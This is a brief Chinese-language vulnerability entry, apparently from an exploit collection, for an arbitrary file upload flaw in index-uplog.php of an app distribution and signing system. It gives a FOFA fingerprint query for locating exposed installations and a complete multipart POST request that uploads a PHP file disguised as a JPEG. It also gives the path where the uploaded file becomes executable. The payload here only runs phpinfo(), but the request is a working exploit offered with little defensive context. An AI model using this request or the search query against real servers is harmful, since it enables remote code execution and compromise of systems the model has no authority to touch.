## APP分发签名系统index-uplog.php存在任意文件上传漏洞

## fofa

```
"statics/css/swiper.min.css" && "/user/messages/dialog"
```

## poc

```
POST /source/pack/upload/2upload/index-uplog.php HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Cache-Control: max-age=0
Connection: keep-alive
Content-Length: 290
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryfF7NbGp0PAFq8Mkd
Host: 127.0.0.1
Origin: http://127.0.0.1
Referer: http://127.0.0.1/source/pack/upload/2upload/index-uplog.php
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
sec-ch-ua: "Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
sec-fetch-user: ?1

------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="time"

1-2
------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="app"; filename="1.php"
Content-Type: image/jpeg

<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```

文件路径

` /source/data/tmp/1-2.php`

![image-20240621195533293](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406211955382.png)

## 漏洞来源

- https://mp.weixin.qq.com/s/hCQnGoV4J-4-g_oEjmheGg